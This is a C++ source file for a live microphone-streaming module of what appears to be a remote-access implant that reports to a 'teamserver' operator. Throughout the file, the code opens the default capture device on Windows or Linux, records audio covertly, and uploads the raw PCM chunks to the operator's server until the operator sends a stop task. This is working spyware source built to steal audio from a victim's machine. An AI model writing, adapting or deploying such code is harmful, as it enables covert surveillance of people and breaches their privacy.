// stream_mic: live microphone streaming.
//
// Records audio from the default capture device and posts PCM chunks
// (4-byte little-endian size prefix + raw bytes) to the teamserver. Runs
// until the operator queues a `stream_stop` task.
//
// Args: [duration_s=0, frames_per_chunk=100]
//   * duration_s: optional safety cap. 0 = run until stop.

#include "../json.hpp"
#include "../protocol.h"
#include "registry.h"
#include "stream_common.h"
#include "stream_state.h"

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <mmsystem.h>
#include <array>
#else
#ifdef NAGOMIO_HAS_ALSA
#include <alsa/asoundlib.h>
#endif
#endif

#include <chrono>
#include <thread>
#include <vector>

namespace nagomio_modules {

static const int MIC_SAMPLE_RATE = 44100;
static const int MIC_CHANNELS = 2;
static const int MIC_BITS_PER_SAMPLE = 16;

#ifdef _WIN32

struct WaveInCtx {
    std::vector<unsigned char> data;
    std::array<WAVEHDR, 8> headers{};
    std::array<std::vector<unsigned char>, 8> buffers{};
};

static void CALLBACK wave_in_proc(HWAVEIN, UINT msg, DWORD_PTR instance,
                                   DWORD_PTR, DWORD) {
    auto* ctx = reinterpret_cast<WaveInCtx*>(instance);
    if (msg == WIM_DATA) {
        for (auto& h : ctx->headers) {
            if (h.dwBytesRecorded > 0) {
                ctx->data.insert(ctx->data.end(),
                                 reinterpret_cast<unsigned char*>(h.lpData),
                                 reinterpret_cast<unsigned char*>(h.lpData) + h.dwBytesRecorded);
                h.dwBytesRecorded = 0;
            }
        }
    }
}

std::string handle_stream_mic(const std::vector<std::string>& args) {
    clear_stream_stop();

    int max_duration_s = nagomio_stream::parse_int_arg(args, 0, 0);
    int frames_per_chunk = nagomio_stream::parse_int_arg(args, 1, 100);
    if (frames_per_chunk < 1) frames_per_chunk = 1;
    if (frames_per_chunk > 200) frames_per_chunk = 200;

    const std::string& agent_id = nagomio_current_agent_id();
    const std::string& task_id  = nagomio_current_task_id();

    WAVEFORMATEX wf{};
    wf.wFormatTag = WAVE_FORMAT_PCM;
    wf.nChannels = MIC_CHANNELS;
    wf.nSamplesPerSec = MIC_SAMPLE_RATE;
    wf.wBitsPerSample = MIC_BITS_PER_SAMPLE;
    wf.nBlockAlign = (wf.nChannels * wf.wBitsPerSample) / 8;
    wf.nAvgBytesPerSec = wf.nSamplesPerSec * wf.nBlockAlign;
    wf.cbSize = 0;

    WaveInCtx ctx;
    HWAVEIN hwi = nullptr;
    if (waveInOpen(&hwi, WAVE_MAPPER, &wf, (DWORD_PTR)wave_in_proc,
                   (DWORD_PTR)&ctx, CALLBACK_FUNCTION) != MMSYSERR_NOERROR)
        return std::string("{\"error\":\"failed to open microphone\"}");

    const int buf_count = 8;
    const int buf_samples = MIC_SAMPLE_RATE / 4;
    const int buf_bytes = buf_samples * wf.nBlockAlign;
    for (int i = 0; i < buf_count; ++i) {
        ctx.buffers[i].resize(buf_bytes);
        ctx.headers[i] = {};
        ctx.headers[i].lpData = reinterpret_cast<LPSTR>(ctx.buffers[i].data());
        ctx.headers[i].dwBufferLength = buf_bytes;
        waveInPrepareHeader(hwi, &ctx.headers[i], sizeof(WAVEHDR));
        waveInAddBuffer(hwi, &ctx.headers[i], sizeof(WAVEHDR));
    }
    waveInStart(hwi);

    auto end_time = max_duration_s > 0
        ? std::chrono::steady_clock::now() + std::chrono::seconds(max_duration_s)
        : std::chrono::steady_clock::time_point::max();
    auto last_flush = std::chrono::steady_clock::now();
    uint32_t seq = 0;
    bool transport_error = false;
    int total_bytes_sent = 0;
    size_t last_pcm_size = 0;

    while (true) {
        if (nagomio_modules::stream_stop_requested()) break;
        if (std::chrono::steady_clock::now() >= end_time) break;
        std::this_thread::sleep_for(std::chrono::milliseconds(50));

        if (ctx.data.size() - last_pcm_size >= static_cast<size_t>(frames_per_chunk * 4096)) {
            std::vector<unsigned char> piece(
                ctx.data.begin() + last_pcm_size,
                ctx.data.end());
            std::string endpoint = "/api/upload/stream/" + agent_id + "/" + task_id;
            std::vector<unsigned char> body;
            nagomio_stream::write_be32(body, seq++);
            nagomio_stream::write_be32(body, 0);
            body.push_back('M'); body.push_back('I'); body.push_back('C'); body.push_back(' ');
            nagomio_stream::write_le32(body, static_cast<uint32_t>(piece.size()));
            body.insert(body.end(), piece.begin(), piece.end());
            auto r = NagomioHttp::post_binary(endpoint, body);
            if (!r.ok || r.status >= 400) { transport_error = true; break; }
            total_bytes_sent += static_cast<int>(piece.size());
            last_pcm_size = ctx.data.size();
            last_flush = std::chrono::steady_clock::now();
        }
    }

    // Final flush with all remaining PCM.
    if (!transport_error && last_pcm_size < ctx.data.size()) {
        std::vector<unsigned char> piece(ctx.data.begin() + last_pcm_size, ctx.data.end());
        std::string endpoint = "/api/upload/stream/" + agent_id + "/" + task_id;
        std::vector<unsigned char> body;
        nagomio_stream::write_be32(body, seq++);
        nagomio_stream::write_be32(body, 1);  // final
        body.push_back('M'); body.push_back('I'); body.push_back('C'); body.push_back(' ');
        nagomio_stream::write_le32(body, static_cast<uint32_t>(piece.size()));
        body.insert(body.end(), piece.begin(), piece.end());
        auto r = NagomioHttp::post_binary(endpoint, body);
        if (!r.ok || r.status >= 400) transport_error = true;
        total_bytes_sent += static_cast<int>(piece.size());
    }

    waveInStop(hwi);
    waveInReset(hwi);
    for (int i = 0; i < buf_count; ++i) {
        waveInUnprepareHeader(hwi, &ctx.headers[i], sizeof(WAVEHDR));
    }
    waveInClose(hwi);
    clear_stream_stop();

    nlohmann::json j = {
        {"type",           "stream_mic"},
        {"sample_rate",    MIC_SAMPLE_RATE},
        {"channels",       MIC_CHANNELS},
        {"bits_per_sample", MIC_BITS_PER_SAMPLE},
        {"total_bytes",    total_bytes_sent},
        {"chunk_count",    static_cast<int>(seq)},
    };
    return j.dump();
}

#else // Linux

#ifdef NAGOMIO_HAS_ALSA

std::string handle_stream_mic(const std::vector<std::string>& args) {
    clear_stream_stop();

    int max_duration_s = nagomio_stream::parse_int_arg(args, 0, 0);

    const std::string& agent_id = nagomio_current_agent_id();
    const std::string& task_id  = nagomio_current_task_id();

    snd_pcm_t* handle = nullptr;
    if (snd_pcm_open(&handle, "default", SND_PCM_STREAM_CAPTURE, 0) < 0)
        return std::string("{\"error\":\"failed to open ALSA capture device\"}");

    snd_pcm_hw_params_t* params = nullptr;
    snd_pcm_hw_params_malloc(&params);
    snd_pcm_hw_params_any(handle, params);
    snd_pcm_hw_params_set_access(handle, params, SND_PCM_ACCESS_RW_INTERLEAVED);
    snd_pcm_hw_params_set_format(handle, params, SND_PCM_FORMAT_S16_LE);
    snd_pcm_hw_params_set_channels(handle, params, MIC_CHANNELS);
    unsigned int rate = MIC_SAMPLE_RATE;
    snd_pcm_hw_params_set_rate_near(handle, params, &rate, nullptr);
    snd_pcm_hw_params(handle, params);
    snd_pcm_hw_params_free(params);
    snd_pcm_prepare(handle);

    const int frame_size = MIC_CHANNELS * (MIC_BITS_PER_SAMPLE / 8);
    int16_t buf[4096];
    auto end_time = max_duration_s > 0
        ? std::chrono::steady_clock::now() + std::chrono::seconds(max_duration_s)
        : std::chrono::steady_clock::time_point::max();
    std::vector<unsigned char> accum;
    uint32_t seq = 0;
    bool transport_error = false;
    int total_bytes_sent = 0;
    const size_t flush_threshold = 200 * 4096;

    while (true) {
        if (nagomio_modules::stream_stop_requested()) break;
        if (std::chrono::steady_clock::now() >= end_time) break;

        int frames = snd_pcm_readi(handle, buf, 4096 / frame_size);
        if (frames > 0) {
            accum.insert(accum.end(),
                         reinterpret_cast<unsigned char*>(buf),
                         reinterpret_cast<unsigned char*>(buf) + frames * frame_size);
        } else if (frames == -EPIPE) {
            snd_pcm_prepare(handle);
        } else if (frames < 0) {
            break;
        }

        if (accum.size() >= flush_threshold) {
            std::string endpoint = "/api/upload/stream/" + agent_id + "/" + task_id;
            std::vector<unsigned char> body;
            nagomio_stream::write_be32(body, seq++);
            nagomio_stream::write_be32(body, 0);
            body.push_back('M'); body.push_back('I'); body.push_back('C'); body.push_back(' ');
            nagomio_stream::write_le32(body, static_cast<uint32_t>(accum.size()));
            body.insert(body.end(), accum.begin(), accum.end());
            auto r = NagomioHttp::post_binary(endpoint, body);
            if (!r.ok || r.status >= 400) { transport_error = true; break; }
            total_bytes_sent += static_cast<int>(accum.size());
            accum.clear();
        }
    }

    if (!transport_error && !accum.empty()) {
        std::string endpoint = "/api/upload/stream/" + agent_id + "/" + task_id;
        std::vector<unsigned char> body;
        nagomio_stream::write_be32(body, seq++);
        nagomio_stream::write_be32(body, 1);
        body.push_back('M'); body.push_back('I'); body.push_back('C'); body.push_back(' ');
        nagomio_stream::write_le32(body, static_cast<uint32_t>(accum.size()));
        body.insert(body.end(), accum.begin(), accum.end());
        auto r = NagomioHttp::post_binary(endpoint, body);
        if (!r.ok || r.status >= 400) transport_error = true;
        total_bytes_sent += static_cast<int>(accum.size());
    }

    snd_pcm_close(handle);
    clear_stream_stop();

    nlohmann::json j = {
        {"type",           "stream_mic"},
        {"sample_rate",    rate},
        {"channels",       MIC_CHANNELS},
        {"bits_per_sample", MIC_BITS_PER_SAMPLE},
        {"total_bytes",    total_bytes_sent},
        {"chunk_count",    static_cast<int>(seq)},
    };
    return j.dump();
}

#else // !NAGOMIO_HAS_ALSA

std::string handle_stream_mic(const std::vector<std::string>&) {
    clear_stream_stop();
    return std::string("{\"error\":\"ALSA not available (install libasound2-dev to enable mic support)\"}");
}

#endif // NAGOMIO_HAS_ALSA
#endif // _WIN32

} // namespace nagomio_modules
